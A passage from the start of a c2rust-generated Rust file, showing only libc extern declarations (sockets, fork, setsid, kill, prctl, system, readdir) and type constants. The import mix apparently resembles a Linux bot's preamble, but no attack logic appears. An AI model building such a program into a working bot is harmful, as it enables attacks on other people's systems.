#![allow(dead_code, mutable_transmutes, non_camel_case_types, non_snake_case, non_upper_case_globals, unused_assignments, unused_mut)]
#![register_tool(c2rust)]
#![feature(asm, c_variadic, extern_types, register_tool)]
extern crate libc;

use c2rust_asm_casts::AsmCastTrait;
use c2rust_bitfields::BitfieldStruct;
use std::arch::asm;
use libc::prctl;
extern "C" {
    pub type __dirstream;
    pub type resolv_entries;
    fn opendir(__name: *const libc::c_char) -> *mut DIR;
    fn closedir(__dirp: *mut DIR) -> libc::c_int;
    fn readdir(__dirp: *mut DIR) -> *mut dirent;
    fn free(__ptr: *mut libc::c_void);
    fn atoi(__nptr: *const libc::c_char) -> libc::c_int;
    fn select(
        __nfds: libc::c_int,
        __readfds: *mut fd_set,
        __writefds: *mut fd_set,
        __exceptfds: *mut fd_set,
        __timeout: *mut timeval,
    ) -> libc::c_int;
    fn rand() -> libc::c_int;
    fn srand(__seed: libc::c_uint);
    fn malloc(_: libc::c_ulong) -> *mut libc::c_void;
    fn calloc(_: libc::c_ulong, _: libc::c_ulong) -> *mut libc::c_void;
    fn realloc(_: *mut libc::c_void, _: libc::c_ulong) -> *mut libc::c_void;
    fn time(__timer: *mut time_t) -> time_t;
    fn exit(_: libc::c_int) -> !;
    fn system(__command: *const libc::c_char) -> libc::c_int;
    fn socket(
        __domain: libc::c_int,
        __type: libc::c_int,
        __protocol: libc::c_int,
    ) -> libc::c_int;
    fn bind(__fd: libc::c_int, __addr: *const sockaddr, __len: socklen_t) -> libc::c_int;
    fn getsockname(
        __fd: libc::c_int,
        __addr: *mut sockaddr,
        __len: *mut socklen_t,
    ) -> libc::c_int;
    fn connect(
        __fd: libc::c_int,
        __addr: *const sockaddr,
        __len: socklen_t,
    ) -> libc::c_int;
    fn send(
        __fd: libc::c_int,
        __buf: *const libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
    ) -> ssize_t;
    fn recv(
        __fd: libc::c_int,
        __buf: *mut libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
    ) -> ssize_t;
    fn sendto(
        __fd: libc::c_int,
        __buf: *const libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
        __addr: *const sockaddr,
        __addr_len: socklen_t,
    ) -> ssize_t;
    fn recvfrom(
        __fd: libc::c_int,
        __buf: *mut libc::c_void,
        __n: size_t,
        __flags: libc::c_int,
        __addr: *mut sockaddr,
        __addr_len: *mut socklen_t,
    ) -> ssize_t;
    fn getsockopt(
        __fd: libc::c_int,
        __level: libc::c_int,
        __optname: libc::c_int,
        __optval: *mut libc::c_void,
        __optlen: *mut socklen_t,
    ) -> libc::c_int;
    fn setsockopt(
        __fd: libc::c_int,
        __level: libc::c_int,
        __optname: libc::c_int,
        __optval: *const libc::c_void,
        __optlen: socklen_t,
    ) -> libc::c_int;
    fn htonl(__hostlong: uint32_t) -> uint32_t;
    fn ntohs(__netshort: uint16_t) -> uint16_t;
    fn ntohl(__netlong: uint32_t) -> uint32_t;
    fn htons(__hostshort: uint16_t) -> uint16_t;
    fn inet_addr(__cp: *const libc::c_char) -> in_addr_t;
    fn inet_ntoa(__in: in_addr) -> *mut libc::c_char;
    fn inet_pton(
        __af: libc::c_int,
        __cp: *const libc::c_char,
        __buf: *mut libc::c_void,
    ) -> libc::c_int;
    fn getaddrinfo(
        __name: *const libc::c_char,
        __service: *const libc::c_char,
        __req: *const addrinfo,
        __pai: *mut *mut addrinfo,
    ) -> libc::c_int;
    fn signal(__sig: libc::c_int, __handler: __sighandler_t) -> __sighandler_t;
    fn kill(__pid: __pid_t, __sig: libc::c_int) -> libc::c_int;
    fn bcopy(__src: *const libc::c_void, __dest: *mut libc::c_void, __n: size_t);
    fn bzero(_: *mut libc::c_void, _: libc::c_ulong);
    fn strcasecmp(_: *const libc::c_char, _: *const libc::c_char) -> libc::c_int;
    fn memcpy(
        _: *mut libc::c_void,
        _: *const libc::c_void,
        _: libc::c_ulong,
    ) -> *mut libc::c_void;
    fn memmove(
        _: *mut libc::c_void,
        _: *const libc::c_void,
        _: libc::c_ulong,
    ) -> *mut libc::c_void;
    fn memset(
        _: *mut libc::c_void,
        _: libc::c_int,
        _: libc::c_ulong,
    ) -> *mut libc::c_void;
    fn strcpy(_: *mut libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strncpy(
        _: *mut libc::c_char,
        _: *const libc::c_char,
        _: libc::c_ulong,
    ) -> *mut libc::c_char;
    fn strcat(_: *mut libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strcmp(_: *const libc::c_char, _: *const libc::c_char) -> libc::c_int;
    fn strncmp(
        _: *const libc::c_char,
        _: *const libc::c_char,
        _: libc::c_ulong,
    ) -> libc::c_int;
    fn strcspn(_: *const libc::c_char, _: *const libc::c_char) -> libc::c_ulong;
    fn strstr(_: *const libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strtok(_: *mut libc::c_char, _: *const libc::c_char) -> *mut libc::c_char;
    fn strlen(_: *const libc::c_char) -> libc::c_ulong;
    fn close(__fd: libc::c_int) -> libc::c_int;
    fn read(__fd: libc::c_int, __buf: *mut libc::c_void, __nbytes: size_t) -> ssize_t;
    fn write(__fd: libc::c_int, __buf: *const libc::c_void, __n: size_t) -> ssize_t;
    fn sleep(__seconds: libc::c_uint) -> libc::c_uint;
    fn usleep(__useconds: __useconds_t) -> libc::c_int;
    fn getcwd(__buf: *mut libc::c_char, __size: size_t) -> *mut libc::c_char;
    fn _exit(_: libc::c_int) -> !;
    fn sysconf(__name: libc::c_int) -> libc::c_long;
    fn getpid() -> __pid_t;
    fn getppid() -> __pid_t;
    fn setsid() -> __pid_t;
    fn setuid(__uid: __uid_t) -> libc::c_int;
    fn seteuid(__uid: __uid_t) -> libc::c_int;
    fn fork() -> __pid_t;
    fn readlink(
        __path: *const libc::c_char,
        __buf: *mut libc::c_char,
        __len: size_t,
    ) -> ssize_t;
    fn unlink(__name: *const libc::c_char) -> libc::c_int;
    fn getdtablesize() -> libc::c_int;
    fn fcntl(__fd: libc::c_int, __cmd: libc::c_int, _: ...) -> libc::c_int;
    fn open(__file: *const libc::c_char, __oflag: libc::c_int, _: ...) -> libc::c_int;
    fn __errno_location() -> *mut libc::c_int;
    fn waitpid(
        __pid: __pid_t,
        __stat_loc: *mut libc::c_int,
        __options: libc::c_int,
    ) -> __pid_t;
    fn ioctl(__fd: libc::c_int, __request: libc::c_ulong, _: ...) -> libc::c_int;
    static mut stderr: *mut _IO_FILE;
    fn fclose(__stream: *mut FILE) -> libc::c_int;
    fn fopen(__filename: *const libc::c_char, __modes: *const libc::c_char) -> *mut FILE;
    fn fprintf(_: *mut FILE, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn sprintf(_: *mut libc::c_char, _: *const libc::c_char, _: ...) -> libc::c_int;
    fn fputc(__c: libc::c_int, __stream: *mut FILE) -> libc::c_int;
    fn fgets(
        __s: *mut libc::c_char,
        __n: libc::c_int,
        __stream: *mut FILE,
    ) -> *mut libc::c_char;
    fn fputs(__s: *const libc::c_char, __stream: *mut FILE) -> libc::c_int;
    fn feof(__stream: *mut FILE) -> libc::c_int;
    fn poll(__fds: *mut pollfd, __nfds: nfds_t, __timeout: libc::c_int) -> libc::c_int;
}
pub type __builtin_va_list = [__va_list_tag; 1];
#[derive(Copy, Clone)]
#[repr(C)]
pub struct __va_list_tag {
    pub gp_offset: libc::c_uint,
    pub fp_offset: libc::c_uint,
    pub overflow_arg_area: *mut libc::c_void,
    pub reg_save_area: *mut libc::c_void,
}
pub type __uid_t = libc::c_uint;
pub type __ino_t = libc::c_ulong;
pub type __off_t = libc::c_long;
pub type __off64_t = libc::c_long;
pub type __pid_t = libc::c_int;
pub type __time_t = libc::c_long;
pub type __useconds_t = libc::c_uint;
pub type __suseconds_t = libc::c_long;
pub type __ssize_t = libc::c_long;
pub type __socklen_t = libc::c_uint;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct dirent {
    pub d_ino: __ino_t,
    pub d_off: __off_t,
    pub d_reclen: libc::c_ushort,
    pub d_type: libc::c_uchar,
    pub d_name: [libc::c_char; 256],
}
pub type DIR = __dirstream;
pub type size_t = libc::c_ulong;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct timeval {
    pub tv_sec: __time_t,
    pub tv_usec: __suseconds_t,
}
pub type pid_t = __pid_t;
pub type ssize_t = __ssize_t;
pub type time_t = __time_t;
pub type u_int8_t = libc::c_uchar;
pub type u_int16_t = libc::c_ushort;
pub type u_int32_t = libc::c_uint;
pub type __fd_mask = libc::c_long;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct fd_set {
    pub __fds_bits: [__fd_mask; 16],
}
pub type va_list = __builtin_va_list;
pub type socklen_t = __socklen_t;
pub type __socket_type = libc::c_uint;
pub const SOCK_NONBLOCK: __socket_type = 2048;
pub const SOCK_CLOEXEC: __socket_type = 524288;
pub const SOCK_PACKET: __socket_type = 10;
pub const SOCK_DCCP: __socket_type = 6;
pub const SOCK_SEQPACKET: __socket_type = 5;
pub const SOCK_RDM: __socket_type = 4;
pub const SOCK_RAW: __socket_type = 3;
pub const SOCK_DGRAM: __socket_type = 2;
pub const SOCK_STREAM: __socket_type = 1;
pub type sa_family_t = libc::c_ushort;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr {
    pub sa_family: sa_family_t,
    pub sa_data: [libc::c_char; 14],
}
pub type C2RustUnnamed = libc::c_uint;
pub const MSG_CMSG_CLOEXEC: C2RustUnnamed = 1073741824;
pub const MSG_FASTOPEN: C2RustUnnamed = 536870912;
pub const MSG_WAITFORONE: C2RustUnnamed = 65536;
pub const MSG_MORE: C2RustUnnamed = 32768;
pub const MSG_NOSIGNAL: C2RustUnnamed = 16384;
pub const MSG_ERRQUEUE: C2RustUnnamed = 8192;
pub const MSG_RST: C2RustUnnamed = 4096;
pub const MSG_CONFIRM: C2RustUnnamed = 2048;
pub const MSG_SYN: C2RustUnnamed = 1024;
pub const MSG_FIN: C2RustUnnamed = 512;
pub const MSG_WAITALL: C2RustUnnamed = 256;
pub const MSG_EOR: C2RustUnnamed = 128;
pub const MSG_DONTWAIT: C2RustUnnamed = 64;
pub const MSG_TRUNC: C2RustUnnamed = 32;
pub const MSG_PROXY: C2RustUnnamed = 16;
pub const MSG_CTRUNC: C2RustUnnamed = 8;
pub const MSG_DONTROUTE: C2RustUnnamed = 4;
pub const MSG_PEEK: C2RustUnnamed = 2;
pub const MSG_OOB: C2RustUnnamed = 1;
pub type uint8_t = libc::c_uchar;
pub type uint16_t = libc::c_ushort;
pub type uint32_t = libc::c_uint;
pub type uint64_t = libc::c_ulong;
pub type intptr_t = libc::c_long;
pub type in_addr_t = uint32_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct in_addr {
    pub s_addr: in_addr_t,
}
pub type C2RustUnnamed_0 = libc::c_uint;
pub const IPPROTO_MAX: C2RustUnnamed_0 = 256;
pub const IPPROTO_RAW: C2RustUnnamed_0 = 255;
pub const IPPROTO_MPLS: C2RustUnnamed_0 = 137;
pub const IPPROTO_UDPLITE: C2RustUnnamed_0 = 136;
pub const IPPROTO_SCTP: C2RustUnnamed_0 = 132;
pub const IPPROTO_COMP: C2RustUnnamed_0 = 108;
pub const IPPROTO_PIM: C2RustUnnamed_0 = 103;
pub const IPPROTO_ENCAP: C2RustUnnamed_0 = 98;
pub const IPPROTO_BEETPH: C2RustUnnamed_0 = 94;
pub const IPPROTO_MTP: C2RustUnnamed_0 = 92;
pub const IPPROTO_AH: C2RustUnnamed_0 = 51;
pub const IPPROTO_ESP: C2RustUnnamed_0 = 50;
pub const IPPROTO_GRE: C2RustUnnamed_0 = 47;
pub const IPPROTO_RSVP: C2RustUnnamed_0 = 46;
pub const IPPROTO_IPV6: C2RustUnnamed_0 = 41;
pub const IPPROTO_DCCP: C2RustUnnamed_0 = 33;
pub const IPPROTO_TP: C2RustUnnamed_0 = 29;
pub const IPPROTO_IDP: C2RustUnnamed_0 = 22;
pub const IPPROTO_UDP: C2RustUnnamed_0 = 17;
pub const IPPROTO_PUP: C2RustUnnamed_0 = 12;
pub const IPPROTO_EGP: C2RustUnnamed_0 = 8;
pub const IPPROTO_TCP: C2RustUnnamed_0 = 6;
pub const IPPROTO_IPIP: C2RustUnnamed_0 = 4;
pub const IPPROTO_IGMP: C2RustUnnamed_0 = 2;
pub const IPPROTO_ICMP: C2RustUnnamed_0 = 1;
pub const IPPROTO_IP: C2RustUnnamed_0 = 0;
pub type in_port_t = uint16_t;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct sockaddr_in {
    pub sin_family: sa_family_t,
    pub sin_port: in_port_t,
    pub sin_addr: in_addr,
    pub sin_zero: [libc::c_uchar; 8],
}
#[derive(Copy, Clone)]
#[repr(C)]
pub struct addrinfo {
    pub ai_flags: libc::c_int,
    pub ai_family: libc::c_int,
    pub ai_socktype: libc::c_int,
    pub ai_protocol: libc::c_int,
    pub ai_addrlen: socklen_t,
    pub ai_addr: *mut sockaddr,
    pub ai_canonname: *mut libc::c_char,
    pub ai_next: *mut addrinfo,
}
pub type __sighandler_t = Option::<unsafe extern "C" fn(libc::c_int) -> ()>;
pub type C2RustUnnamed_1 = libc::c_uint;
pub const _SC_THREAD_ROBUST_PRIO_PROTECT: C2RustUnnamed_1 = 248;
pub const _SC_THREAD_ROBUST_PRIO_INHERIT: C2RustUnnamed_1 = 247;
pub const _SC_XOPEN_STREAMS: C2RustUnnamed_1 = 246;
pub const _SC_TRACE_USER_EVENT_MAX: C2RustUnnamed_1 = 245;
pub const _SC_TRACE_SYS_MAX: C2RustUnnamed_1 = 244;
pub const _SC_TRACE_NAME_MAX: C2RustUnnamed_1 = 243;
pub const _SC_TRACE_EVENT_NAME_MAX: C2RustUnnamed_1 = 242;
pub const _SC_SS_REPL_MAX: C2RustUnnamed_1 = 241;
pub const _SC_V7_LPBIG_OFFBIG: C2RustUnnamed_1 = 240;
pub const _SC_V7_LP64_OFF64: C2RustUnnamed_1 = 239;
pub const _SC_V7_ILP32_OFFBIG: C2RustUnnamed_1 = 238;
pub const _SC_V7_ILP32_OFF32: C2RustUnnamed_1 = 237;
pub const _SC_RAW_SOCKETS: C2RustUnnamed_1 = 236;
pub const _SC_IPV6: C2RustUnnamed_1 = 235;
pub const _SC_LEVEL4_CACHE_LINESIZE: C2RustUnnamed_1 = 199;
pub const _SC_LEVEL4_CACHE_ASSOC: C2RustUnnamed_1 = 198;
pub const _SC_LEVEL4_CACHE_SIZE: C2RustUnnamed_1 = 197;
pub const _SC_LEVEL3_CACHE_LINESIZE: C2RustUnnamed_1 = 196;
pub const _SC_LEVEL3_CACHE_ASSOC: C2RustUnnamed_1 = 195;
pub const _SC_LEVEL3_CACHE_SIZE: C2RustUnnamed_1 = 194;
pub const _SC_LEVEL2_CACHE_LINESIZE: C2RustUnnamed_1 = 193;
pub const _SC_LEVEL2_CACHE_ASSOC: C2RustUnnamed_1 = 192;
pub const _SC_LEVEL2_CACHE_SIZE: C2RustUnnamed_1 = 191;
pub const _SC_LEVEL1_DCACHE_LINESIZE: C2RustUnnamed_1 = 190;
pub const _SC_LEVEL1_DCACHE_ASSOC: C2RustUnnamed_1 = 189;
pub const _SC_LEVEL1_DCACHE_SIZE: C2RustUnnamed_1 = 188;
pub const _SC_LEVEL1_ICACHE_LINESIZE: C2RustUnnamed_1 = 187;
pub const _SC_LEVEL1_ICACHE_ASSOC: C2RustUnnamed_1 = 186;
pub const _SC_LEVEL1_ICACHE_SIZE: C2RustUnnamed_1 = 185;
pub const _SC_TRACE_LOG: C2RustUnnamed_1 = 184;
pub const _SC_TRACE_INHERIT: C2RustUnnamed_1 = 183;
pub const _SC_TRACE_EVENT_FILTER: C2RustUnnamed_1 = 182;
pub const _SC_TRACE: C2RustUnnamed_1 = 181;
pub const _SC_HOST_NAME_MAX: C2RustUnnamed_1 = 180;
pub const _SC_V6_LPBIG_OFFBIG: C2RustUnnamed_1 = 179;
pub const _SC_V6_LP64_OFF64: C2RustUnnamed_1 = 178;
pub const _SC_V6_ILP32_OFFBIG: C2RustUnnamed_1 = 177;
pub const _SC_V6_ILP32_OFF32: C2RustUnnamed_1 = 176;
pub const _SC_2_PBS_CHECKPOINT: C2RustUnnamed_1 = 175;
pub const _SC_STREAMS: C2RustUnnamed_1 = 174;
pub const _SC_SYMLOOP_MAX: C2RustUnnamed_1 = 173;
pub const _SC_2_PBS_TRACK: C2RustUnnamed_1 = 172;
pub const _SC_2_PBS_MESSAGE: C2RustUnnamed_1 = 171;
pub const _SC_2_PBS_LOCATE: C2RustUnnamed_1 = 170;
pub const _SC_2_PBS_ACCOUNTING: C2RustUnnamed_1 = 169;
pub const _SC_2_PBS: C2RustUnnamed_1 = 168;
pub const _SC_USER_GROUPS_R: C2RustUnnamed_1 = 167;
pub const _SC_USER_GROUPS: C2RustUnnamed_1 = 166;
pub const _SC_TYPED_MEMORY_OBJECTS: C2RustUnnamed_1 = 165;
pub const _SC_TIMEOUTS: C2RustUnnamed_1 = 164;
pub const _SC_SYSTEM_DATABASE_R: C2RustUnnamed_1 = 163;
pub const _SC_SYSTEM_DATABASE: C2RustUnnamed_1 = 162;
pub const _SC_THREAD_SPORADIC_SERVER: C2RustUnnamed_1 = 161;
pub const _SC_SPORADIC_SERVER: C2RustUnnamed_1 = 160;
pub const _SC_SPAWN: C2RustUnnamed_1 = 159;
pub const _SC_SIGNALS: C2RustUnnamed_1 = 158;
pub const _SC_SHELL: C2RustUnnamed_1 = 157;
pub const _SC_REGEX_VERSION: C2RustUnnamed_1 = 156;
pub const _SC_REGEXP: C2RustUnnamed_1 = 155;
pub const _SC_SPIN_LOCKS: C2RustUnnamed_1 = 154;
pub const _SC_READER_WRITER_LOCKS: C2RustUnnamed_1 = 153;
pub const _SC_NETWORKING: C2RustUnnamed_1 = 152;
pub const _SC_SINGLE_PROCESS: C2RustUnnamed_1 = 151;
pub const _SC_MULTI_PROCESS: C2RustUnnamed_1 = 150;
pub const _SC_MONOTONIC_CLOCK: C2RustUnnamed_1 = 149;
pub const _SC_FILE_SYSTEM: C2RustUnnamed_1 = 148;
pub const _SC_FILE_LOCKING: C2RustUnnamed_1 = 147;
pub const _SC_FILE_ATTRIBUTES: C2RustUnnamed_1 = 146;
pub const _SC_PIPE: C2RustUnnamed_1 = 145;
pub const _SC_FIFO: C2RustUnnamed_1 = 144;
pub const _SC_FD_MGMT: C2RustUnnamed_1 = 143;
pub const _SC_DEVICE_SPECIFIC_R: C2RustUnnamed_1 = 142;
pub const _SC_DEVICE_SPECIFIC: C2RustUnnamed_1 = 141;
pub const _SC_DEVICE_IO: C2RustUnnamed_1 = 140;
pub const _SC_THREAD_CPUTIME: C2RustUnnamed_1 = 139;
pub const _SC_CPUTIME: C2RustUnnamed_1 = 138;
pub const _SC_CLOCK_SELECTION: C2RustUnnamed_1 = 137;
pub const _SC_C_LANG_SUPPORT_R: C2RustUnnamed_1 = 136;
pub const _SC_C_LANG_SUPPORT: C2RustUnnamed_1 = 135;
pub const _SC_BASE: C2RustUnnamed_1 = 134;
pub const _SC_BARRIERS: C2RustUnnamed_1 = 133;
pub const _SC_ADVISORY_INFO: C2RustUnnamed_1 = 132;
pub const _SC_XOPEN_REALTIME_THREADS: C2RustUnnamed_1 = 131;
pub const _SC_XOPEN_REALTIME: C2RustUnnamed_1 = 130;
pub const _SC_XOPEN_LEGACY: C2RustUnnamed_1 = 129;
pub const _SC_XBS5_LPBIG_OFFBIG: C2RustUnnamed_1 = 128;
pub const _SC_XBS5_LP64_OFF64: C2RustUnnamed_1 = 127;
pub const _SC_XBS5_ILP32_OFFBIG: C2RustUnnamed_1 = 126;
pub const _SC_XBS5_ILP32_OFF32: C2RustUnnamed_1 = 125;
pub const _SC_NL_TEXTMAX: C2RustUnnamed_1 = 124;
pub const _SC_NL_SETMAX: C2RustUnnamed_1 = 123;
pub const _SC_NL_NMAX: C2RustUnnamed_1 = 122;
pub const _SC_NL_MSGMAX: C2RustUnnamed_1 = 121;
pub const _SC_NL_LANGMAX: C2RustUnnamed_1 = 120;
pub const _SC_NL_ARGMAX: C2RustUnnamed_1 = 119;
pub const _SC_USHRT_MAX: C2RustUnnamed_1 = 118;
pub const _SC_ULONG_MAX: C2RustUnnamed_1 = 117;
pub const _SC_UINT_MAX: C2RustUnnamed_1 = 116;
pub const _SC_UCHAR_MAX: C2RustUnnamed_1 = 115;
pub const _SC_SHRT_MIN: C2RustUnnamed_1 = 114;
pub const _SC_SHRT_MAX: C2RustUnnamed_1 = 113;
pub const _SC_SCHAR_MIN: C2RustUnnamed_1 = 112;
pub const _SC_SCHAR_MAX: C2RustUnnamed_1 = 111;
pub const _SC_SSIZE_MAX: C2RustUnnamed_1 = 110;
pub const _SC_NZERO: C2RustUnnamed_1 = 109;
pub const _SC_MB_LEN_MAX: C2RustUnnamed_1 = 108;
pub const _SC_WORD_BIT: C2RustUnnamed_1 = 107;
pub const _SC_LONG_BIT: C2RustUnnamed_1 = 106;
pub const _SC_INT_MIN: C2RustUnnamed_1 = 105;
pub const _SC_INT_MAX: C2RustUnnamed_1 = 104;
pub const _SC_CHAR_MIN: C2RustUnnamed_1 = 103;
pub const _SC_CHAR_MAX: C2RustUnnamed_1 = 102;
pub const _SC_CHAR_BIT: C2RustUnnamed_1 = 101;
pub const _SC_XOPEN_XPG4: C2RustUnnamed_1 = 100;
pub const _SC_XOPEN_XPG3: C2RustUnnamed_1 = 99;
pub const _SC_XOPEN_XPG2: C2RustUnnamed_1 = 98;
pub const _SC_2_UPE: C2RustUnnamed_1 = 97;
pub const _SC_2_C_VERSION: C2RustUnnamed_1 = 96;
pub const _SC_2_CHAR_TERM: C2RustUnnamed_1 = 95;
pub const _SC_XOPEN_SHM: C2RustUnnamed_1 = 94;
pub const _SC_XOPEN_ENH_I18N: C2RustUnnamed_1 = 93;
pub const _SC_XOPEN_CRYPT: C2RustUnnamed_1 = 92;
pub const _SC_XOPEN_UNIX: C2RustUnnamed_1 = 91;
pub const _SC_XOPEN_XCU_VERSION: C2RustUnnamed_1 = 90;
pub const _SC_XOPEN_VERSION: C2RustUnnamed_1 = 89;
pub const _SC_PASS_MAX: C2RustUnnamed_1 = 88;
pub const _SC_ATEXIT_MAX: C2RustUnnamed_1 = 87;
pub const _SC_AVPHYS_PAGES: C2RustUnnamed_1 = 86;
pub const _SC_PHYS_PAGES: C2RustUnnamed_1 = 85;
pub const _SC_NPROCESSORS_ONLN: C2RustUnnamed_1 = 84;
pub const _SC_NPROCESSORS_CONF: C2RustUnnamed_1 = 83;
pub const _SC_THREAD_PROCESS_SHARED: C2RustUnnamed_1 = 82;
pub const _SC_THREAD_PRIO_PROTECT: C2RustUnnamed_1 = 81;
pub const _SC_THREAD_PRIO_INHERIT: C2RustUnnamed_1 = 80;
pub const _SC_THREAD_PRIORITY_SCHEDULING: C2RustUnnamed_1 = 79;
pub const _SC_THREAD_ATTR_STACKSIZE: C2RustUnnamed_1 = 78;
pub const _SC_THREAD_ATTR_STACKADDR: C2RustUnnamed_1 = 77;
pub const _SC_THREAD_THREADS_MAX: C2RustUnnamed_1 = 76;
pub const _SC_THREAD_STACK_MIN: C2RustUnnamed_1 = 75;
pub const _SC_THREAD_KEYS_MAX: C2RustUnnamed_1 = 74;
pub const _SC_THREAD_DESTRUCTOR_ITERATIONS: C2RustUnnamed_1 = 73;
pub const _SC_TTY_NAME_MAX: C2RustUnnamed_1 = 72;
pub const _SC_LOGIN_NAME_MAX: C2RustUnnamed_1 = 71;
pub const _SC_GETPW_R_SIZE_MAX: C2RustUnnamed_1 = 70;
pub const _SC_GETGR_R_SIZE_MAX: C2RustUnnamed_1 = 69;
pub const _SC_THREAD_SAFE_FUNCTIONS: C2RustUnnamed_1 = 68;
pub const _SC_THREADS: C2RustUnnamed_1 = 67;
pub const _SC_T_IOV_MAX: C2RustUnnamed_1 = 66;
pub const _SC_PII_OSI_M: C2RustUnnamed_1 = 65;
pub const _SC_PII_OSI_CLTS: C2RustUnnamed_1 = 64;
pub const _SC_PII_OSI_COTS: C2RustUnnamed_1 = 63;
pub const _SC_PII_INTERNET_DGRAM: C2RustUnnamed_1 = 62;
pub const _SC_PII_INTERNET_STREAM: C2RustUnnamed_1 = 61;
pub const _SC_IOV_MAX: C2RustUnnamed_1 = 60;
pub const _SC_UIO_MAXIOV: C2RustUnnamed_1 = 60;
pub const _SC_SELECT: C2RustUnnamed_1 = 59;
pub const _SC_POLL: C2RustUnnamed_1 = 58;
pub const _SC_PII_OSI: C2RustUnnamed_1 = 57;
pub const _SC_PII_INTERNET: C2RustUnnamed_1 = 56;
pub const _SC_PII_SOCKET: C2RustUnnamed_1 = 55;
pub const _SC_PII_XTI: C2RustUnnamed_1 = 54;
pub const _SC_PII: C2RustUnnamed_1 = 53;
pub const _SC_2_LOCALEDEF: C2RustUnnamed_1 = 52;
pub const _SC_2_SW_DEV: C2RustUnnamed_1 = 51;
pub const _SC_2_FORT_RUN: C2RustUnnamed_1 = 50;
pub const _SC_2_FORT_DEV: C2RustUnnamed_1 = 49;
pub const _SC_2_C_DEV: C2RustUnnamed_1 = 48;
pub const _SC_2_C_BIND: C2RustUnnamed_1 = 47;
pub const _SC_2_VERSION: C2RustUnnamed_1 = 46;
pub const _SC_CHARCLASS_NAME_MAX: C2RustUnnamed_1 = 45;
pub const _SC_RE_DUP_MAX: C2RustUnnamed_1 = 44;
pub const _SC_LINE_MAX: C2RustUnnamed_1 = 43;
pub const _SC_EXPR_NEST_MAX: C2RustUnnamed_1 = 42;
pub const _SC_EQUIV_CLASS_MAX: C2RustUnnamed_1 = 41;
pub const _SC_COLL_WEIGHTS_MAX: C2RustUnnamed_1 = 40;
pub const _SC_BC_STRING_MAX: C2RustUnnamed_1 = 39;
pub const _SC_BC_SCALE_MAX: C2RustUnnamed_1 = 38;
pub const _SC_BC_DIM_MAX: C2RustUnnamed_1 = 37;
pub const _SC_BC_BASE_MAX: C2RustUnnamed_1 = 36;
pub const _SC_TIMER_MAX: C2RustUnnamed_1 = 35;
pub const _SC_SIGQUEUE_MAX: C2RustUnnamed_1 = 34;
pub const _SC_SEM_VALUE_MAX: C2RustUnnamed_1 = 33;
pub const _SC_SEM_NSEMS_MAX: C2RustUnnamed_1 = 32;
pub const _SC_RTSIG_MAX: C2RustUnnamed_1 = 31;
pub const _SC_PAGESIZE: C2RustUnnamed_1 = 30;
pub const _SC_VERSION: C2RustUnnamed_1 = 29;
pub const _SC_MQ_PRIO_MAX: C2RustUnnamed_1 = 28;
pub const _SC_MQ_OPEN_MAX: C2RustUnnamed_1 = 27;
pub const _SC_DELAYTIMER_MAX: C2RustUnnamed_1 = 26;
pub const _SC_AIO_PRIO_DELTA_MAX: C2RustUnnamed_1 = 25;
pub const _SC_AIO_MAX: C2RustUnnamed_1 = 24;
pub const _SC_AIO_LISTIO_MAX: C2RustUnnamed_1 = 23;
pub const _SC_SHARED_MEMORY_OBJECTS: C2RustUnnamed_1 = 22;
pub const _SC_SEMAPHORES: C2RustUnnamed_1 = 21;
pub const _SC_MESSAGE_PASSING: C2RustUnnamed_1 = 20;
pub const _SC_MEMORY_PROTECTION: C2RustUnnamed_1 = 19;
pub const _SC_MEMLOCK_RANGE: C2RustUnnamed_1 = 18;
pub const _SC_MEMLOCK: C2RustUnnamed_1 = 17;
pub const _SC_MAPPED_FILES: C2RustUnnamed_1 = 16;
pub const _SC_FSYNC: C2RustUnnamed_1 = 15;
pub const _SC_SYNCHRONIZED_IO: C2RustUnnamed_1 = 14;
pub const _SC_PRIORITIZED_IO: C2RustUnnamed_1 = 13;
pub const _SC_ASYNCHRONOUS_IO: C2RustUnnamed_1 = 12;
pub const _SC_TIMERS: C2RustUnnamed_1 = 11;
pub const _SC_PRIORITY_SCHEDULING: C2RustUnnamed_1 = 10;
pub const _SC_REALTIME_SIGNALS: C2RustUnnamed_1 = 9;
pub const _SC_SAVED_IDS: C2RustUnnamed_1 = 8;
pub const _SC_JOB_CONTROL: C2RustUnnamed_1 = 7;
pub const _SC_TZNAME_MAX: C2RustUnnamed_1 = 6;
pub const _SC_STREAM_MAX: C2RustUnnamed_1 = 5;
pub const _SC_OPEN_MAX: C2RustUnnamed_1 = 4;
pub const _SC_NGROUPS_MAX: C2RustUnnamed_1 = 3;
pub const _SC_CLK_TCK: C2RustUnnamed_1 = 2;
pub const _SC_CHILD_MAX: C2RustUnnamed_1 = 1;
pub const _SC_ARG_MAX: C2RustUnnamed_1 = 0;
#[derive(Copy, Clone)]
#[repr(C)]
pub struct _IO_FILE {
    pub _flags: libc::c_int,
    pub _IO_read_ptr: *mut libc::c_char,
    pub _IO_read_end: *mut libc::c_char,
    pub _IO_read_base: *mut libc::c_char,
    pub _IO_write_base: *mut libc::c_char,
    pub _IO_write_ptr: *mut libc::c_char,
    pub _IO_write_end: *mut libc::c_char,
    pub _IO_buf_base: *mut libc::c_char,
    pub _IO_buf_end: *mut libc::c_char,
    pub _IO_save_base: *mut libc::c_char,
    pub _IO_backup_base: *mut libc::c_char,
    pub _IO_save_end: *mut libc::c_char,
    pub _markers: *mut _IO_marker,
    pub _chain: *mut _IO_FILE,
    pub _fileno: libc::c_int,
    pub _flags2: libc::c_int,
    pub _old_offset: __off_t,
    pub _cur_column: libc::c_ushort,
    pub _vtable_offset: libc::c_schar,
    pub _shortbuf: [libc::c_char; 1],
    pub _lock: *mut libc::c_void,
    pub _offset: __off64_t,
    pub __pad1: *mut libc::c_void,
    pub __pad2: *mut libc::c_void,
    pub __pad3: *mut libc::c_void,
    pub __pad4: *mut libc::c_void,
    pub __pad5: size_t,
    pub _mode: libc::c_int,
    pub _unused2: [libc::c_char; 20],
}
pub type _IO_lock_t = ();
#[derive(Copy, Clone)]
